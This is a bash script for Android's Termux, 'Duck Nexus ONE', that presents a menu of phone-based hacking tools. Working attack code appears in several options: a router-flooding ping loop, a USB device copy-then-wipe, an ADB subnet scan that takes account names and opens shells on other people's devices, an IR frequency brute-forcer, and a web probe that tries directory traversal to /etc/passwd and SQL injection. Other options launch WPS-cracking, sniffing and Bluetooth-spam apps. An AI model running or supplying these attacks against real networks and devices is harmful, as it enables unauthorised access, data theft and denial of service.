#!/data/data/com.termux/files/usr/bin/bash
# test
termux-wake-lock
MODULES="/data/data/com.termux/files/usr/share/ducknexus/modules"
if [[ "$(ls $MODULES 2>/dev/null)" = "" ]]; then
  mkdir -p $MODULES
fi
if [[ "$(termux-fingerprint | jq -r '.auth_result')" = "AUTH_RESULT_SUCCESS" ]]; then
termux-toast "Unlocked."
elif [[ "$(termux-fingerprint | jq -r '.auth_result')" != "AUTH_RESULT_SUCCESS" ]]; then
exit 0
elif [[ "$(termux-fingerprint | jq -r '.errors')" = "ERROR_NO_ENROLLED_FINGERPRINTS" ]]; then
echo ""
fi
echo "Duck Nexus ONE" | lolcat
echo "Make sure you have the following apps installed: UniMote, Mi Remote (required only in IR supported phones), Screen Mirroring - TV Miracast, PandwaRF, DroidSheep, PentestKit Mobile, Bluetooth LE Spam, WPSApp, Termux-API (with all permissions granted) and Universal TV Remote Control."
while true; do
read -p "Home
[1] TV Remote Control (WiFi Required)
[2] Universal Device Remote Control (IR Required)
[3] Mirror phone on TV (WiFi Required)
[4] Frequency Analyzer (PandwaRF Required)
[5] Router Killer (WiFi Required)
[6] Pentester's Kit
[7] Sniff Network (Root Required)
[8] Copy device files (OTG & Root Required)
[9] Brute force frequencies (IR Required)
[10] Bluetooth Spam (Bluetooth Required)
[11] WPS Hack (WiFi Required)
[12] Change others phone bright (Auto Bright Required)
[13] Create/Edit an Custom module
[14] Download an Custom module (WiFi Required)
[15] Use a Custom module
[16] Send custom Infrared (IR Required)
[17] Delete an Custom module
[18] Read an NFC Tag (NFC Required)
[19] Write in an NFC Tag (NFC Required)
[20] Code any text (IRREVERSIBLE!)
[21] Ducky BIN - Upload (Internet Required)
[22] Ducky BIN - See (Internet Required)
[23] Galaxy Mode (Internet Required)
[24] Listen to an Frequency in Hz
[25] Search for lights
[26] AndroControl (Internet Required)
[27] Scan for ScreenStream vulnerable devices (Internet Required)
[28] Try to catch a IP behind a VPN (Internet Required)
[29] Monitor a website (Internet Required)
[30] Basic vulnerability scan on a website (Internet Required)
[31] HorSec Webserver
[32] TV Remote control v2 (better) (IR & Internet Required)
Your choice: " choice
if [[ "$choice" = "1" ]]; then
  am start -n sensustech.universal.tv.remote.control/sensustech.universal.tv.remote.control.activities.SplashActivity
elif [[ "$choice" = "2" ]]; then
  am start -n com.duokan.phone.remotecontroller/com.xiaomi.mitv.phone.remotecontroller.HoriWidgetMainActivityV2
elif [[ "$choice" = "3" ]]; then
  am start -n com.studiosoolter.screenmirroring.miracast.apps/com.studiosoolter.screenmirroring.miracast.apps.activities.SplashActivity
elif [[ "$choice" = "4" ]]; then
  am start -n com.comthings.pandwarf/com.comthings.gollum.app.gollumtest.rfsub1gApp.activities.GollumSplashActivity
elif [[ "$choice" = "5" ]]; then
  read -p "Router IP: " ip
  while true
  do
    ping -t 255 -c 500000000000 -s 30000 $ip &
 done
elif [[ "$choice" = "6" ]]; then
  am start -n com.pentestkit/com.pentestkit.MainActivity
elif [[ "$choice" = "7" ]]; then
  am start -n de.trier.infsec.koch.droidsheep/de.trier.infsec.koch.droidsheep.activities.ListenActivity
elif [[ "$choice" = "8" ]]; then
  usb=$(ls /storage | tr -d 'emulated')
  cp -r /storage/$usb ~/duckph
  echo "Device files copied to ~/duckph. Press Enter to erase device, Ctrl+C to not erase."
  read a
  cd /storage/$usb && rm -rf *
elif [[ "$choice" = "9" ]]; then
  echo "Point your device to the target."
  num=0
  while true
  do
    num=$(($num + 1))
    termux-infrared-transmit -f $num 50,50,50,50
  done
elif [[ "$choice" = "10" ]]; then
  am start -n de.simon.dankelmann.bluetoothlespam/de.simon.dankelmann.bluetoothlespam.MainActivity
elif [[ "$choice" = "11" ]]; then
  am start -n com.themausoft.wpsapp/com.themausoft.wpsapp.InitActivity
elif [[ "$choice" = "12" ]]; then
  echo "Please know that Auto Bright is Required only on Target phone. This option may not work on every phones. This option will only change the bright of the other phone to a major bright, So, You can not control what bright will be set to the other phone. Now, Point your lantern to the other phone, Press Ctrl+C to cancel or Enter to continue."
  read blabla1
  termux-torch on
  echo "Press Enter to stop."
  read blabla2
  termux-torch off
elif [[ "$choice" = "13" ]]; then
  read -p "Module file name: " name
  echo "How to use: Write your module, Then press Ctrl+X, Type Y, And click Enter."
  echo "Please, use a shebang if you will not use Bash!"
  read -p "Press Enter to continue." blabla3
  nano /data/data/com.termux/files/usr/share/ducknexus/modules/$name
  chmod +x $MODULES/$name
  termux-fix-shebang $MODULES/$name
elif [[ "$choice" = "14" ]]; then
  read -p "Link of module: " link1
  read -p "Name of module: " name1
  wget $link1 -O $MODULES/$name1
elif [[ "$choice" = "15" ]]; then
  if [[ "$(ls $MODULES)" = "" ]]; then
    echo "There are no modules."
  else
    echo "Custom modules:"
    ls $MODULES
    read -p "Module file name to use: " name2
    $MODULES/$name2
  fi
elif [[ "$choice" = "16" ]]; then
  echo "Help: Transmit an infrared pattern. The pattern is specified in comma-separated on/off intervals, such as \"20,50,20,30\". Only patterns shorter than 2 seconds will be transmitted. Example: 00000 That is the IR Frequency in Hertz, And 0,0,0,0 (Pattern)"
  read -p "Infrared to transmit: " infra1
  termux-infrared-transmit -f $infra1
elif [[ "$choice" = "17" ]]; then
  echo "Due to critical errors, modules will not be shown in this option."
  read -p "Module to delete: " name3
  rm $MODULES/$name3
elif [[ "$choice" = "18" ]]; then
  echo "Reading... Do not move!"
  termux-nfc -r full
elif [[ "$choice" = "19" ]]; then
  read -p "Information to Write: " info1
  echo "$banner1"
  echo "Writing..."
  termux-nfc -w "$info1"
elif [[ "$choice" = "20" ]]; then
  read -p "Text to code: " text
  text0=$(echo "$text" | sha1sum)
  text1=$(echo "$text0" | md5sum)
  text2=$(echo "$text1" | sha224sum)
  text3=$(echo "$text2" | sha256sum)
  text4=$(echo "$text3" | sha384sum)
  text5=$(echo "$text4" | sha512sum)
  text6=$(echo "$text5" | xxd -p)
  text8=$(echo "$text6" | base64)
  echo "Coded text: $text8"
elif [[ "$choice" = "21" ]]; then
  read -p "Code: " code
  read -p "Note: " note
  echo "Note will self-destruct after one read."
  echo "$note" | nc -lp $code
elif [[ "$choice" = "22" ]]; then
  read -p "Ducky BIN location: " loc1
  read -p "Ducky BIN code: " code1
  nc $loc1 $code1
elif [[ "$choice" = "23" ]]; then
termux-open-url 'https://br.android.trygalaxy.com/?fullscreen=true&redirect=false'
elif [[ "$choice" = "24" ]]; then
read -p "Frequency: " hz
play -n synth 0.1 sin $hz >/dev/null 2>&1
elif [[ "$choice" = "25" ]]; then
light_value=$(termux-sensor -n 1 -s LIGHT | grep -o '[0-9]\+')

if [ "$light_value" = "0" ] || [ -z "$light_value" ]; then
    echo "There is no light pointing on the phone."
else
    echo "There is light pointing on the phone."
fi
elif [[ "$choice" = "26" ]]; then
#!/data/data/com.termux/files/usr/bin/bash

echo "AndroControl - Control the devices in your network. (by simpleuser)" | lolcat

read -p "Enter the router IP address to scan (e.g., 192.168.1.1): " router_ip

devices=$(nmap -p 5555 $router_ip/24 -oG - | grep "/open" | awk '{print $2}')

for device in $devices; do
    read -p "Control device $device? (y/n): " choice
    if [ "$choice" = "y" ]; then
        echo "Connecting to device $device..."
        adb connect $device
        echo "Uptime:"
        adb shell uptime
        echo "Battery:"
        adb shell 'dumpsys battery | grep level'
        echo "Device GMail:"
        adb shell "dumpsys | grep 'com.google.android.gms.auth.accountstate/com.google/' | cut -d '/' -f 3 | cut -d ':' -f 1 | sed 's/com.google//g' | uniq"
        echo "Obtaining device shell..."
        adb shell
        else
            echo "Failed to connect to $device. Skipping..."
        fi
done
elif [[ "$choice" = "27" ]]; then
read -p "Your router first digits IP (e.g, 192.168.x): " ip
# TODO: why the fuck is the variable doing output as the variable name. i will kms if i cant fix that shit.
echo "When u see <title>ScreenStream</title> in front of an IP, it means the device is vulnerable."
for ip2 in $(seq 255); do
try=$(curl -s $ip.$ip2:8080 2>/dev/null | grep ScreenStream)
done
echo "$ip.$ip2:8080 $try"
# TODO: i think im blind now.
elif [[ "$choice" = "28" ]]; then
read -p "IP: " ip
vpn=$(curl -sI "$ip":8080 | cut -d ' ' -f 3)
if [[ "$vpn" != "" ]]; then
echo "This IP seems to be behind the VPN $vpn."
else
tor=$(nslookup $ip | grep "name =" | awk '{print $4}')
if [[ "$tor" = *"tor"* || "$tor" = *"Tor"* ]]; then
echo "This IP is behind the Tor network."
else
echo "No VPN/Proxy detected."
fi
fi
elif [[ "$choice" = "29" ]]; then
read -p "Website: " url
printed=0

echo "Monitoring $url..."

while true; do
    response=$(curl -s -o /dev/null -w "%{http_code}" --head "$url")
    if [[ $response == "200" || $response == "301" || $response == "302" ]]; then
        if [ $printed -eq 0 ]; then
            echo "Website is up."
            printed=1
        fi
    elif [[ $response != "200" && $response != "301" && $response != "302" && $printed -ne 2 ]]; then
        echo "Website is down."
        printed=2
    fi
    sleep 5
done
elif [[ "$choice" = "30" ]]; then
read -p "Website: " website
echo "Trying Directory Traversal in $website"
traverse=$(curl -s $website/../../../etc/passwd%00 | grep "root:x:0:0:root:/root:/bin/bash")
if [[ "$traverse" = "" ]]; then
echo "Directory Traversal not detected. Skipping to next vulnerability (XSS)..."
else
echo "Directory Traversal detected in $website/../../../etc/passwd%00"
fi
xss=$(curl -s $website | grep "innerHTML")
if [[ "$xss" = "" ]]; then
echo 'XSS not detected. Skipping to next vulnerability (SQLi)...'
else
echo "XSS detected in $website"
fi
sqli=$(curl -sL "$website'" | grep "SQL Syntax")
if [[ "$sqli" = "" ]]; then
echo "SQLi not detected."
else
echo "SQLi detected in $website'"
fi
elif [[ "$choice" = "31" ]]; then
read -p "Port: " port
read -p "Index file: " index
input=$index
length=$(wc -c $index | sed s/$input//g)
length2=$(expr $length - 1)
content=$(cat $index)
reply=$(echo -e "HTTP/1.1 200 OK\r\nAccept-Ranges: bytes\r\nContent-Type: text/html; charset=UTF-8\r\nDate: $(date)\r\nServer: HorSec Webserv\r\nContent-Length: $length2\r\n\r\n$content\r\n")
while true; do
echo "$reply" | nc -nlp $port -q 0 -vvvvvv -k
done
elif [[ "$choice" = "32" ]]; then
am start -n codematics.universal.tv.remote.control/codematics.universal.tv.remote.control.activities._LogoScreen
fi
done
